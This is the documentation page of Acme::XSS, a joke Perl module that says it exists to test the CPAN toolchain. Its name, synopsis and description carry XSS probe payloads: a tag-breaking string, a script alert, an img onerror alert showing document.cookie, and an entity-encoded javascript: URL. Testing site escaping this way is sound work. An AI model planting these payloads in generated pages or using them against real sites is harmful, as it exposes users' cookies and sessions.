# NAME

Acme::XSS - "><xmp>XSS Testing

# SYNOPSIS

    use Acme::XSS;
    <xmp>

# DESCRIPTION

This is a module to testing CPAN toolchain.

<div>
    <script>alert("all your codes are belongs to us");</script>
    <img onerror="javascript:alert(document.cookie);" src="/">
    <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
</div>

# AUTHOR

Tokuhiro Matsuno <tokuhirom AAJKLFJEF GMAIL COM>

# SEE ALSO

# LICENSE

Copyright (C) Tokuhiro Matsuno

This library is free software; you can redistribute it and/or modify
it under the same terms as Perl itself.
